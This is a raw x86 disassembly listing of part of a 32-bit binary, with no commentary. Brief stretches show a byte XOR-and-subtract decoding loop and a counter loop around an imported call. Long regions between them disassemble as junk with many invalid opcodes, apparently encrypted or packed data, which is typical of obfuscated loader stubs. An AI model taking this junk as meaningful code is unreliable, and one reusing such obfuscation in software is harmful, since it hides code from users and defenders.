  404150:	movzx  ecx,WORD PTR ds:0x433643
  404157:	or     ecx,DWORD PTR ds:0x433697
  40415d:	mov    DWORD PTR ds:0x433643,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4336f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43375b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	cli    
  4041aa:	xor    DWORD PTR [edi+eax*2],ebp
  4041ad:	test   al,0x24
  4041af:	jl     0x40422d
  4041b1:	stos   DWORD PTR es:[edi],eax
  4041b2:	jg     0x404230
  4041b4:	jl     0x404213
  4041b6:	jbe    0x4041e4
  4041b8:	mov    cl,0xf3
  4041ba:	fadd   DWORD PTR [ebx-0x35f015b0]
  4041c0:	dec    esp
  4041c1:	xor    dh,cl
  4041c3:	jge    0x404191
  4041c5:	(bad)  
  4041c6:	icebp  
  4041c7:	sub    edx,ecx
  4041c9:	mov    bl,0x3e
  4041cb:	jnp    0x4041ec
  4041cd:	add    BYTE PTR [ebp+0x49b2d5cb],cl
  4041d3:	xor    ecx,0xffffffaa
  4041d6:	xlat   BYTE PTR ds:[ebx]
  4041d7:	xchg   ebx,eax
  4041d8:	push   edx
  4041d9:	sbb    DWORD PTR [edi],eax
  4041db:	hlt    
  4041dc:	cmp    cl,ch
  4041de:	arpl   WORD PTR [edi-0x4a],ax
  4041e1:	mov    ebp,0xdc2e713e
  4041e6:	push   eax
  4041e7:	je     0x404266
  4041e9:	and    esp,DWORD PTR [eax-0xe]
  4041ec:	or     ecx,ebx
  4041ee:	jmp    0x887ca7a5
  4041f3:	daa    
  4041f4:	mov    ecx,0xd98e973e
  4041f9:	ja     0x40418a
  4041fb:	cs and eax,0xb45d852a
  404201:	xchg   ecx,eax
  404202:	push   ss
  404203:	fs xchg edx,eax
  404205:	xchg   esi,eax
  404206:	leave  
  404207:	fwait
  404208:	bound  esp,QWORD PTR [ebp-0x4d]
  40420b:	adc    DWORD PTR [ebx+0x59],eax
  40420e:	inc    edx
  40420f:	sbb    BYTE PTR [ebp+eax*8+0x7d],ah
  404213:	jnp    0x4041f2
  404215:	lods   al,BYTE PTR ds:[esi]
  404216:	hlt    
  404217:	sub    dl,BYTE PTR [ecx]
  404219:	xor    al,BYTE PTR [edi]
  40421b:	fstp   TBYTE PTR [ebx]
  40421d:	mul    DWORD PTR [ecx+0x804a40e]
  404223:	dec    DWORD PTR [esi+0x62cd9093]
  404229:	xchg   ebp,eax
  40422a:	iret   
  40422b:	mov    eax,ds:0x61a8ffba
  404230:	xchg   esi,ebx
  404232:	repz int 0x26
  404235:	cwde   
  404236:	fwait
  404237:	retf   0xf439
  40423a:	(bad)  
  40423b:	outs   dx,DWORD PTR ds:[esi]
  40423c:	push   edx
  40423d:	add    esi,edx
  40423f:	pop    eax
  404240:	add    eax,0x8da90a02
  404245:	fisttp DWORD PTR [esi]
  404247:	clc    
  404248:	xchg   esp,eax
  404249:	pop    ebp
  40424a:	test   BYTE PTR [esi],al
  40424c:	repnz sub ecx,DWORD PTR [edx-0x4a]
  404250:	jnp    0x404279
  404252:	xacquire xchg DWORD PTR [eax+0x36],eax
  404256:	pop    eax
  404257:	push   edi
  404258:	lods   al,BYTE PTR ds:[esi]
  404259:	mov    ds:0x96753de5,eax
  40425e:	xchg   edx,eax
  40425f:	arpl   WORD PTR [ebx-0x63],cx
  404262:	lahf   
  404263:	mov    bl,0x37
  404265:	xchg   ecx,eax
  404266:	cwde   
  404267:	add    esi,DWORD PTR [eax]
  404269:	mov    ds:0x3d7ec15e,al
  40426e:	or     BYTE PTR [eax-0x5c],al
  404271:	add    DWORD PTR [ebp-0x69],0x9872abf0
  404278:	mov    eax,ds:0x5010f59a
  40427d:	test   al,0x60
  40427f:	inc    eax
  404280:	mov    ecx,0xfeda4cf9
  404285:	cdq    
  404286:	push   esp
  404287:	cs mov esi,0xedb89067
  40428d:	(bad)  
  40428e:	push   ecx
  40428f:	inc    edi
  404290:	test   eax,0x3366ad3a
  404295:	enter  0x458a,0x62
  404299:	xor    BYTE PTR es:[edi+0x284b075a],ah
  4042a0:	mov    al,0xa5
  4042a2:	leave  
  4042a3:	test   cl,ch
  4042a5:	aas    
  4042a6:	add    eax,0x2aa87b0a
  4042ab:	xor    BYTE PTR [ecx-0x639ce582],dl
  4042b1:	repnz and ebx,DWORD PTR [esi+eiz*1-0x59fc6469]
  4042b9:	xor    eax,DWORD PTR [edi+esi*8+0xd]
  4042bd:	(bad)  
  4042be:	adc    DWORD PTR [edi+esi*4+0x38f9d822],esp
  4042c5:	or     al,0x33
  4042c7:	sub    DWORD PTR [ecx],eax
  4042c9:	push   0xffffffc7
  4042cb:	mov    ds:0xab1efa87,al
  4042d0:	sub    esp,DWORD PTR [ecx-0x38d4ba22]
  4042d6:	scas   al,BYTE PTR es:[edi]
  4042d7:	xchg   ebp,eax
  4042d8:	inc    edx
  4042d9:	leave  
  4042da:	mov    WORD PTR [esi],gs
  4042dc:	sub    eax,0xf5e4159
  4042e1:	enter  0xd2bd,0x6e
  4042e5:	mov    ebx,0x438c03aa
  4042ea:	xlat   BYTE PTR ds:[ebx]
  4042eb:	add    dh,BYTE PTR [ebx+ebx*4]
  4042ee:	in     al,dx
  4042ef:	dec    ebp
  4042f0:	push   edx
  4042f1:	jge    0x40427e
  4042f3:	jne    0x404336
  4042f5:	add    eax,0xf5b3d566
  4042fa:	fimul  WORD PTR [esi+ecx*1]
  4042fd:	jne    0x4042bb
  4042ff:	fwait
  404300:	xchg   ecx,eax
  404301:	sbb    al,0xc9
  404303:	cmp    eax,0xd6a167b4
  404308:	sub    DWORD PTR [eax-0x60932ebc],edx
  40430e:	(bad)  
  40430f:	ror    esp,1
  404311:	mov    dl,0xfb
  404313:	stos   DWORD PTR es:[edi],eax
  404314:	cwde   
  404315:	mov    cs,WORD PTR [ecx+edx*1]
  404318:	jle    0x4042df
  40431a:	fstp   st(1)
  40431c:	int3   
  40431d:	xchg   BYTE PTR [esi],dh
  40431f:	fdiv   DWORD PTR [ecx-0x78]
  404322:	pop    ebp
  404323:	outs   dx,DWORD PTR ds:[esi]
  404324:	in     eax,0x11
  404326:	daa    
  404327:	sar    BYTE PTR ds:0x5736b33c,1
  40432d:	sub    cl,BYTE PTR [esp+eax*1]
  404330:	jns    0x40433a
  404332:	stos   DWORD PTR es:[edi],eax
  404333:	rol    ch,0xf0
  404336:	cld    
  404337:	retf   
  404338:	(bad)  
  404339:	arpl   WORD PTR [eax],si
  40433b:	mul    DWORD PTR [ebx+edx*2]
  40433e:	or     bl,cl
  404340:	jb     0x404318
  404342:	push   ebp
  404343:	or     al,0xd9
  404345:	lods   eax,DWORD PTR ds:[esi]
  404346:	mov    ds:0xa7e28fdb,eax
  40434b:	add    DWORD PTR [edi+0x74],esp
  40434e:	std    
  40434f:	out    dx,al
  404350:	out    dx,eax
  404351:	jge    0x4042d8
  404353:	jp     0x4042df
  404355:	lods   al,BYTE PTR ds:[esi]
  404356:	dec    esi
  404357:	loope  0x404364
  404359:	lock pop ebp
  40435b:	mov    al,0xd0
  40435d:	jmp    0x187f:0xd2d85e8f
  404364:	dec    ebp
  404365:	and    al,0x0
  404367:	(bad)  
  404368:	fadd   st(1),st
  40436a:	push   esi
  40436b:	or     DWORD PTR ds:0x43371f,0x4643
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43372f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43372f,0x4336ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	xchg   bl,ch
  4043a3:	jne    0x404351
  4043a5:	out    0x26,eax
  4043a7:	jl     0x404425
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x4043f2
  4043ae:	aas    
  4043af:	test   DWORD PTR [ecx+0x6c32431b],esi
  4043b5:	call   0x105a:0x6e8ed622
  4043bc:	or     ecx,DWORD PTR [edx+0x62]
  4043bf:	lods   eax,DWORD PTR ds:[esi]
  4043c0:	stc    
  4043c1:	jo     0x404377
  4043c3:	loopne 0x40436e
  4043c5:	cmc    
  4043c6:	sti    
  4043c7:	pop    ebx
  4043c8:	outs   dx,BYTE PTR ds:[esi]
  4043c9:	into   
  4043ca:	dec    eax
  4043cb:	imul   ebp,DWORD PTR [ecx],0xffffffc5
  4043ce:	(bad)  
  4043cf:	or     eax,0x69b5fe33
  4043d4:	sbb    ah,al
  4043d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043d7:	inc    eax
  4043d8:	(bad)  
  4043d9:	and    esp,DWORD PTR ds:[ecx+0x6b]
  4043dd:	sbb    eax,0x262aa6e5
  4043e2:	add    eax,0xb8500405
  4043e7:	(bad)  
  4043e8:	cmp    eax,0xe58d2d39
  4043ed:	lods   eax,DWORD PTR ds:[esi]
  4043ee:	fnsave [ebp-0x31be096d]
  4043f4:	and    al,0x7a
  4043f6:	dec    ebx
  4043f7:	xlat   BYTE PTR ds:[ebx]
  4043f8:	retf   0x5c5d
  4043fb:	mov    dh,bh
  4043fd:	std    
  4043fe:	pop    esi
  4043ff:	and    ecx,DWORD PTR [esi]
  404401:	paddb  mm4,mm5
  404404:	sub    dl,BYTE PTR gs:[ebx+0x226bad07]
  40440b:	test   eax,0x99fd1ae5
  404410:	or     eax,0xea8f06c1
  404415:	loope  0x4043a1
  404417:	imul   dl
  404419:	enter  0x6,0xee
  40441d:	push   esp
  40441e:	and    ch,BYTE PTR ds:0xd39e
  404423:	retf   0x7e7d
  404426:	push   eax
  404427:	jmp    0xc605:0x2be31d01
  40442e:	enter  0x5d78,0x43
  404432:	hlt    
  404433:	push   eax
  404434:	xor    eax,0xc0306496
  404439:	sbb    BYTE PTR [edi-0x4122da26],ch
  40443f:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404441:	xchg   ebp,eax
  404442:	fwait
  404443:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404444:	sub    al,0x3
  404446:	fdivr  st,st(5)
  404448:	pop    ebp
  404449:	jno    0x404482
  40444b:	mov    esi,edx
  40444d:	ss jb  0x404444
  404450:	out    dx,al
  404451:	mov    ch,0x34
  404453:	cmp    eax,0x13506a74
  404458:	dec    edi
  404459:	mov    BYTE PTR [ebx+0x55],al
  40445c:	jg     0x4044b7
  40445e:	jb     0x40444e
  404460:	inc    edi
  404461:	dec    esp
  404462:	or     ecx,eax
  404464:	mov    BYTE PTR [ebp-0xa],cl
  404467:	mov    ebp,0x7db221cb
  40446c:	ffree  st(0)
  40446e:	cli    
  40446f:	adc    ebx,ecx
  404471:	mov    ebx,0x5cc919f7
  404476:	or     ah,BYTE PTR [ebx+ebx*2]
  404479:	mov    eax,ds:0xc0aedc77
  40447e:	lds    edx,FWORD PTR [ecx+esi*2]
  404481:	xchg   eax,edx
  404483:	sti    
  404484:	adc    eax,0x962f50d4
  404489:	cwde   
  40448a:	jmp    0x338b:0xd8c20526
  404491:	add    BYTE PTR [ebx-0x2f510231],0xe2
  404498:	rcr    DWORD PTR [esi-0x57e0b5ac],cl
  40449e:	xor    al,0x1d
  4044a0:	fisub  DWORD PTR [ebx+0x64d13d5a]
  4044a6:	shr    BYTE PTR [esi+0x186ab0b],cl
  4044ac:	sbb    BYTE PTR [esi],cl
  4044ae:	out    0xe4,al
  4044b0:	out    dx,al
  4044b1:	push   cs
  4044b2:	add    ecx,DWORD PTR [eax+0x52c7da]
  4044b8:	icebp  
  4044b9:	dec    edi
  4044ba:	mov    ds:0xc11536a1,al
  4044bf:	cmp    ebp,ebx
  4044c1:	out    dx,eax
  4044c2:	fsubp  st(6),st
  4044c4:	scas   al,BYTE PTR es:[edi]
  4044c5:	cs test eax,0x9dabaa7c
  4044cb:	(bad)
  4044ce:	std    
  4044cf:	pop    eax
  4044d0:	imul   ebp,ecx,0x68584a9d
  4044d6:	push   ebp
  4044d7:	pop    edi
  4044d8:	repz test DWORD PTR [eax+0x30],0x68d38fdc
  4044e0:	sub    bl,BYTE PTR [edi-0x52b42c62]
  4044e6:	mov    ah,0x83
  4044e8:	sub    cl,BYTE PTR [ebx+0x5ea68b3]
  4044ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4044ef:	mov    cl,0x7d
  4044f1:	stc    
  4044f2:	and    dl,BYTE PTR [ebx]
  4044f4:	inc    edx
  4044f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f6:	fwait
  4044f7:	adc    al,0x17
  4044f9:	sbb    ebp,DWORD PTR [edi-0x20]
  4044fc:	inc    ecx
  4044fd:	dec    ecx
  4044fe:	cld    
  4044ff:	neg    BYTE PTR [ebp+edi*8+0x1c99b9c3]
  404506:	sub    al,0x7c
  404508:	sub    ecx,ebp
  40450a:	adc    DWORD PTR [esi-0x49f44401],eax
  404510:	pop    esi
  404511:	ja     0x4044b8
  404513:	xor    eax,0x263c8e64
  404518:	mov    BYTE PTR [esi-0x6b27089f],al
  40451e:	sbb    BYTE PTR [ecx-0x6ee70aba],dh
  404524:	fnstsw WORD PTR [ebx+0x15]
  404527:	add    DWORD PTR [esi],edi
  404529:	jmp    0xd025a48d
  40452e:	and    al,0x56
  404530:	mov    edi,0x715ebe4d
  404535:	aas    
  404536:	mov    ah,BYTE PTR [ecx-0x6b3f54da]
  40453c:	mov    edi,0x1c661371
  404541:	jmp    0x404537
  404543:	pushf  
  404544:	xchg   esi,eax
  404545:	and    eax,0x30751caf
  40454a:	pop    ds
  40454b:	sti    
  40454c:	xchg   esi,eax
  40454d:	std    
  40454e:	jmp    0x99fe:0xc26a5628
  404555:	(bad)
  404559:	and    al,0x6f
  40455b:	pop    es
  40455c:	jbe    0x4045be
  40455e:	sub    bl,BYTE PTR [ecx-0x39fc1cd9]
  404564:	jmp    0x404757
  404569:	mov    DWORD PTR ds:0x4336a7,0x6267
  404573:	mov    dl,BYTE PTR [ebp-0x1]
  404576:	mov    DWORD PTR ds:0x433653,0x1c06
  404580:	jmp    0x404752
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0xacc2aa9d
  404592:	mov    WORD PTR fs:[edx+edx*1-0x548383e0],es
  40459a:	jg     0x404618
  40459c:	jl     0x40456a
  40459e:	ret    
  40459f:	cmp    eax,0x4be70faa
  4045a4:	sbb    al,0xfd
  4045a6:	and    ch,BYTE PTR [ecx+ecx*2]
  4045a9:	jns    0x40453c
  4045ab:	ins    DWORD PTR es:[edi],dx
  4045ac:	rcl    BYTE PTR [ebx-0x73],1
  4045af:	je     0x404532
  4045b1:	or     eax,0x50b965fd
  4045b6:	(bad)  
  4045b7:	std    
  4045b8:	and    eax,ecx
  4045ba:	cmc    
  4045bb:	imul   DWORD PTR [eax+0x27a6f5a1]
  4045c1:	add    eax,0xb82267c9
  4045c6:	leave  
  4045c7:	sbb    BYTE PTR [edi+0x6a525b44],cl
  4045cd:	out    0x4a,eax
  4045cf:	fld    QWORD PTR [ebx-0x5]
  4045d2:	sub    bh,BYTE PTR [edx-0x42]
  4045d5:	and    eax,0x738cf8c2
  4045da:	jge    0x40457f
  4045dc:	mov    al,0x71
  4045de:	mov    bl,0x83
  4045e0:	into   
  4045e1:	cmc    
  4045e2:	mov    edx,0xf29fbca2
  4045e7:	icebp  
  4045e8:	mov    edi,0x62443ccd
  4045ed:	fmulp  st(7),st
  4045ef:	scas   al,BYTE PTR es:[edi]
  4045f0:	lds    edx,FWORD PTR es:[eax+edx*8]
  4045f4:	dec    esi
  4045f5:	and    DWORD PTR [edx-0x73],ebx
  4045f8:	je     0x4045d2
  4045fa:	add    esp,DWORD PTR ds:0x1bbfa346
  404600:	sti    
  404601:	lods   eax,DWORD PTR ds:[esi]
  404602:	pop    ebp
  404603:	jo     0x404665
  404605:	popf   
  404606:	fisttp WORD PTR [edi+ecx*1-0x418f04eb]
  40460d:	jo     0x4045ca
  40460f:	lock mov ah,0x2c
  404612:	arpl   WORD PTR [ebx],sp
  404614:	pop    esi
  404615:	data16 mov bl,0x0
  404618:	push   cs
  404619:	repnz sar BYTE PTR [edx+0x1],cl
  40461d:	sbb    BYTE PTR [esi+0x74],ah
  404620:	inc    eax
  404621:	push   ecx
  404622:	les    esi,FWORD PTR [edx-0x257d8928]
  404628:	pop    ds
  404629:	fs push es
  40462b:	jbe    0x404652
  40462d:	add    eax,ecx
  40462f:	dec    ecx
  404630:	test   al,0x7b
  404632:	lds    edx,FWORD PTR [esi+0x33]
  404635:	cld    
  404636:	je     0x404604
  404638:	loopne 0x40467c
  40463a:	mov    dh,0x97
  40463c:	sub    edi,ecx
  40463e:	fisttp QWORD PTR [ebx+0x79c20159]
  404644:	lock adc DWORD PTR [ebp+eiz*1-0x6a5a449e],eax
  40464c:	mov    es,WORD PTR [esi]
  40464e:	cmp    al,0x7d
  404650:	pop    edi
  404651:	arpl   di,di
  404653:	xor    al,0x82
  404655:	stc    
  404656:	stos   BYTE PTR es:[edi],al
  404657:	iret   
  404658:	outs   dx,BYTE PTR ds:[esi]
  404659:	inc    ecx
  40465a:	cmp    esp,DWORD PTR [ebx]
  40465c:	repnz fisub WORD PTR [eax+0x4d]
  404660:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404661:	movzx  edi,BYTE PTR [esi-0x241c0e06]
  404668:	(bad)  
  40466a:	outs   dx,BYTE PTR ds:[esi]
  40466b:	jnp    0x40461e
  40466d:	sub    eax,ebp
  40466f:	cld    
  404670:	rol    BYTE PTR [ebp+0x47b53b86],0xf4
  404677:	pop    esi
  404678:	leave  
  404679:	addr16 in al,dx
  40467b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40467c:	ror    BYTE PTR [edx],0xef
  40467f:	or     dh,dh
  404681:	add    edx,DWORD PTR [ebx+0xd]
  404684:	and    eax,0xaeee3e0e
  404689:	mov    ecx,0x4f38bcf3
  40468e:	adc    DWORD PTR [edx-0x59e121e6],0xffffffeb
  404695:	xor    bl,BYTE PTR [ebx+0x30392129]
  40469b:	dec    eax
  40469c:	test   al,0xdb
  40469e:	add    DWORD PTR [edi-0x73f23d51],edx
  4046a4:	loope  0x40466e
  4046a6:	jecxz  0x40464f
  4046a8:	imul   esp,DWORD PTR [ebx+0x46],0xffffffd9
  4046ac:	int    0x58
  4046ae:	retf   0x39bf
  4046b1:	sbb    al,0xf6
  4046b3:	push   edi
  4046b4:	fisubr WORD PTR [ebp-0x33]
  4046b7:	push   ss
  4046b8:	inc    ebx
  4046b9:	icebp  
  4046ba:	pop    ds
  4046bb:	pop    es
  4046bc:	inc    esi
  4046bd:	addr16 and al,0x21
  4046c0:	and    al,0xa
  4046c2:	lea    ebp,[ebp+0x1fe7c3f7]
  4046c8:	xchg   esp,eax
  4046c9:	leave  
  4046ca:	pop    ebx
  4046cb:	clc    
  4046cc:	sbb    al,0xde
  4046ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4046cf:	cli    
  4046d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046d1:	rcl    DWORD PTR [ecx+ebp*2],cl
  4046d4:	push   edx
  4046d5:	mov    al,0x75
  4046d7:	lea    ecx,[edi+0x15]
  4046da:	and    BYTE PTR [ecx],cl
  4046dc:	jns    0x404701
  4046de:	je     0x4046a8
  4046e0:	xlat   BYTE PTR ds:[ebx]
  4046e1:	lods   al,BYTE PTR ds:[esi]
  4046e2:	pop    ecx
  4046e3:	sbb    eax,0xef317c8d
  4046e8:	or     dl,bh
  4046ea:	ret    
  4046eb:	lock push es
  4046ed:	aam    0x96
  4046ef:	dec    ecx
  4046f0:	jb     0x4046f6
  4046f2:	push   cs
  4046f3:	shl    BYTE PTR ds:0x3c7a5f8d,1
  4046f9:	ror    ch,cl
  4046fb:	aad    0x5a
  4046fd:	or     eax,0x2df9387d
  404702:	imul   esi,DWORD PTR [eax],0x12900a95
  404708:	(bad)  
  404709:	ja     0x4046ee
  40470b:	shl    DWORD PTR ds:0xbd3c7133,cl
  404711:	loope  0x40471e
  404713:	std    
  404714:	pop    ebp
  404715:	std    
  404716:	xor    al,0x70
  404718:	ret    0xe721
  40471b:	mov    eax,ds:0x7f6d604e
  404720:	outs   dx,DWORD PTR ds:[esi]
  404721:	pop    edx
  404722:	pushf  
  404723:	sub    al,0x34
  404725:	nop
  404726:	gs xor al,0x8e
  404729:	(bad)  
  40472a:	jmp    0xf772513e
  40472f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404730:	jp     0x4046d0
  404732:	or     eax,0xe79453ec
  404737:	(bad)  
  404738:	es scas al,BYTE PTR es:[edi]
  40473a:	outs   dx,DWORD PTR ds:[esi]
  40473b:	scas   al,BYTE PTR es:[edi]
  40473c:	push   0xffffffb6
  40473e:	daa    
  40473f:	les    edi,FWORD PTR [ebx-0x6e]
  404742:	ins    BYTE PTR es:[edi],dx
  404743:	jmp    0x24dc:0x9924324d
  40474a:	lea    edx,[ecx+0x6d352a61]
  404750:	cmp    al,0x3b
  404752:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  404756:	inc    eax
  404757:	mov    DWORD PTR ds:0x43364f,0xde3
  404761:	cmp    eax,0x40
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433757
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43363f,0x14
  40477d:	cmp    DWORD PTR ds:0x43363f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43363f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43363f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43363f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43363f,eax
  4047c3:	mov    eax,ds:0x43363f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43363f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4336e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4336d7,0x43376f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4336db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4336e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4336f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x404828
  40481f:	and    BYTE PTR [ebp+0x7c2349aa],ch
  404825:	jl     0x4047d2
  404827:	jg     0x4048a5
  404829:	jl     0x40488c
  40482b:	mov    edi,0xa512bdaa
  404830:	test   eax,0xdfff02cb
  404835:	xchg   edx,eax
  404836:	sbb    al,0xbe
  404838:	les    ecx,FWORD PTR [eax+ebx*1-0x645dee55]
  40483f:	ss out 0xd,al
  404842:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404843:	sbb    DWORD PTR ss:[eax+0x38931176],esp
  40484a:	in     eax,0x7a
  40484c:	cmp    eax,0x6a116a79
  404851:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404852:	getsec 
  404854:	xor    edx,DWORD PTR [ecx-0x403070f2]
  40485a:	inc    ebx
  40485b:	in     eax,0xec
  40485d:	ins    DWORD PTR es:[edi],dx
  40485e:	jo     0x404879
  404860:	and    esp,DWORD PTR [ecx-0x8]
  404863:	ret    0xed5c
  404866:	jb     0x404837
  404868:	dec    esi
  404869:	mov    bl,0x94
  40486b:	xor    ecx,ecx
  40486d:	inc    ebp
  40486e:	xchg   ebp,eax
  40486f:	loope  0x4048bb
  404871:	out    dx,al
  404872:	(bad)  
  404873:	jno    0x4048e6
  404875:	add    al,0xb8
  404877:	retf   
  404878:	inc    edi
  404879:	cmp    ebp,0x28244a77
  40487f:	in     al,0x4b
  404881:	in     al,dx
  404882:	xor    ebp,DWORD PTR [ecx]
  404884:	jmp    0x6a7b79c5
  404889:	pushf  
  40488a:	cmp    ah,al
  40488c:	mov    ?,WORD PTR [ecx-0x62]
  40488f:	adc    BYTE PTR [edi],bh
  404891:	in     al,0x4e
  404893:	mov    ds:0x5ba4e8be,eax
  404898:	sbb    DWORD PTR [eax+0x71607ca8],edx
  40489e:	or     esp,DWORD PTR [eax]
  4048a0:	push   0x5b
  4048a2:	ror    DWORD PTR [ebx-0x1b34e4e],0x59
  4048a9:	and    DWORD PTR ds:0x29fa9912,edx
  4048af:	arpl   WORD PTR [edi-0x48],ax
  4048b2:	mov    esi,fs
  4048b4:	aas    
  4048b5:	fild   WORD PTR [ecx+0x1afc7a52]
  4048bb:	pushf  
  4048bc:	push   ss
  4048bd:	jne    0x40491e
  4048bf:	jne    0x4048ab
  4048c1:	enter  0x2007,0x8e
  4048c5:	and    al,0x40
  4048c7:	rol    BYTE PTR [esi+0x6d],cl
  4048ca:	xchg   esi,eax
  4048cb:	clc    
  4048cc:	ja     0x4048e7
  4048ce:	mov    dl,BYTE PTR [ebp-0x46e5fa16]
  4048d4:	xor    edi,eax
  4048d6:	std    
  4048d7:	and    DWORD PTR [esi],edx
  4048d9:	mov    ecx,0x1669ede8
  4048de:	jp     0x40492e
  4048e0:	aad    0x45
  4048e2:	pop    ds
  4048e3:	sub    BYTE PTR [ebx+0x79],0x72
  4048e7:	push   cs
  4048e8:	jl     0x4048f3
  4048ea:	xor    al,0xd4
  4048ec:	aad    0x4c
  4048ee:	and    DWORD PTR gs:[eax],0x253d6218
  4048f5:	jne    0x404919
  4048f7:	jmp    0x4048fb
  4048f9:	into   
  4048fa:	xchg   ecx,eax
  4048fb:	ret    0xfbf3
  4048fe:	idiv   BYTE PTR [edx+0x7b]
  404901:	dec    esp
  404902:	push   esp
  404903:	cmp    al,0x55
  404905:	shr    DWORD PTR [edi+0x62],0xe1
  404909:	sub    eax,eax
  40490b:	lods   eax,DWORD PTR gs:[esi]
  40490d:	and    eax,0x59ce3486
  404912:	xchg   edx,eax
  404913:	int3   
  404914:	enter  0xa705,0x7e
  404918:	out    0xd5,eax
  40491a:	xchg   BYTE PTR [edi-0x2b8e3be6],ch
  404920:	retf   0x1afc
  404923:	in     eax,0x31
  404925:	test   bl,dh
  404927:	(bad)  [ecx+0x55]
  40492a:	sti    
  40492b:	jnp    0x404922
  40492d:	inc    edx
  40492e:	mov    dh,0xe6
  404930:	or     eax,0x6b0a1d11
  404935:	in     eax,dx
  404936:	and    BYTE PTR [ebx+0x41],cl
  404939:	pop    esi
  40493a:	inc    ecx
  40493b:	fsubr  QWORD PTR [esi+esi*4]
  40493e:	fs pop ss
  404940:	(bad)  
  404941:	fild   QWORD PTR [esp+ebp*4-0x72a0273b]
  404948:	fucomip st,st(7)
  40494a:	cmp    DWORD PTR ds:0xef34ef3d,eax
  404950:	xor    eax,0x74f79a15
  404955:	or     DWORD PTR [edi-0x6ca0a2c],ecx
  40495b:	shl    dh,cl
  40495d:	jne    0x40490c
  40495f:	xchg   DWORD PTR [ebp-0x3065fcf7],eax
  404965:	add    al,BYTE PTR ds:0x870892c7
  40496b:	outs   dx,BYTE PTR ds:[esi]
  40496c:	pop    edi
  40496d:	retf   
  40496e:	push   0xffffffe8
  404970:	mov    dh,0x7d
  404972:	iret   
  404973:	ret    
  404974:	inc    eax
  404975:	dec    esp
  404976:	mov    dl,0xae
  404978:	pop    esi
  404979:	cmp    dh,BYTE PTR [edi+0x2c46fa3]
  40497f:	sbb    ebx,DWORD PTR [eax+0x41712159]
  404985:	daa    
  404986:	jae    0x4049b8
  404988:	push   ebx
  404989:	ret    
  40498a:	es mov ecx,0x5ef4cb4
  404990:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404991:	fs xchg ecx,eax
  404993:	sub    ebp,edi
  404995:	mov    bh,0xd4
  404997:	push   ebp
  404998:	add    ecx,edi
  40499a:	or     al,0x6b
  40499c:	xchg   ebx,eax
  40499d:	imul   ebp,DWORD PTR [edx],0x5f
  4049a0:	(bad)  
  4049a1:	and    al,0xc4
  4049a3:	mov    DWORD PTR [ebp+eax*4+0x5fc63fc4],ebx
  4049aa:	cs in  eax,0x3c
  4049ad:	jno    0x4049f3
  4049af:	clc    
  4049b0:	add    DWORD PTR [ecx-0x70964ca7],esp
  4049b6:	jle    0x4049de
  4049b8:	mov    dh,0x9
  4049ba:	bound  esi,QWORD PTR [eax+0x57]
  4049bd:	in     al,dx
  4049be:	mov    cl,0x44
  4049c0:	fist   WORD PTR [ecx+0x4e]
  4049c3:	pop    ebx
  4049c4:	push   eax
  4049c5:	(bad)  
  4049c6:	pop    ss
  4049c7:	icebp  
  4049c8:	(bad)  
